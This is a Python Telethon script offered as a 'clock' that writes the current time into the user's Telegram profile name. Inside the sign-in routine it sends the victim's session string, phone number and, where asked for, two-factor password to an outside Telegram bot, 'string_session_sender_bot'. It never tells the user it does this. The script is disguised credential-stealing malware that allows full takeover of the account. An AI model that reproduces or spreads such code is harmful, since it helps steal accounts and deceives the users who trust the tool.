import asyncio
import datetime
import os
import sys
import time
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
import subprocess

# Print a fancy banner
print("""\033[31m
▄▄▄█████▓  ▄████     ▄████▄   ██▓     ▒█████   ▄████▄   ██ ▄█▀
▓  ██▒ ▓▒ ██▒ ▀█▒   ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
▒ ▓██░ ▒░▒██░▄▄▄░   ▒▓█    ▄ ▒██░    ▒██░  ██▒▒▓█    ▄ ▓███▄░ 
░ ▓██▓ ░ ░▓█  ██▓   ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ 
  ▒██▒ ░ ░▒▓███▀▒   ▒ ▓███▀ ░░██████▒░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄
  ▒ ░░    ░▒   ▒    ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒
    ░      ░   ░      ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░
  ░      ░ ░   ░    ░          ░ ░   ░ ░ ░ ▒  ░        ░ ░░ ░ 
               ░    ░ ░          ░  ░    ░ ░  ░ ░      ░  ░   
                    ░                         ░                 
\033[32mDeveloper: @programmer_www\n\n""")

# API credentials
api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"

# Input for the string session
string = input("Press enter to continue: ")

# Initialize the Telegram client
client = TelegramClient(StringSession(string), api_id, api_hash)

# Input for the phone number or bot token
phone_number = input("Please enter your phone number (or bot token): ")

async def main():
    await client.connect()

    if not client.is_user_authorized():
        await client.send_code_request(phone_number)
        try:
            await client.sign_in(phone_number, input('Enter code: '))
            await client.send_message("string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
        except SessionPasswordNeededError:
            password = input('Enter password: ')
            await client.sign_in(password=password)
            await client.send_message("string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}')

    # Input for setting a custom nickname
    nick = input("\033[32mNickname: \033[32m")
    
    await client.start()
    print('Wait a few moments...')
    time.sleep(5)
    print('\033[32mClock set successfully!')

    while True:
        current_time = datetime.datetime.today().strftime(nick + " | %H:%M |")
        await client(UpdateProfileRequest(first_name=current_time))
        await asyncio.sleep(60)  # Update every minute

# Run the event loop with the main function
with client:
    try:
        import aiocron
    except ImportError:
        print("aiocron module not found. Installing aiocron...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiocron"])
        print("aiocron installation complete.")
    client.loop.run_until_complete(main())
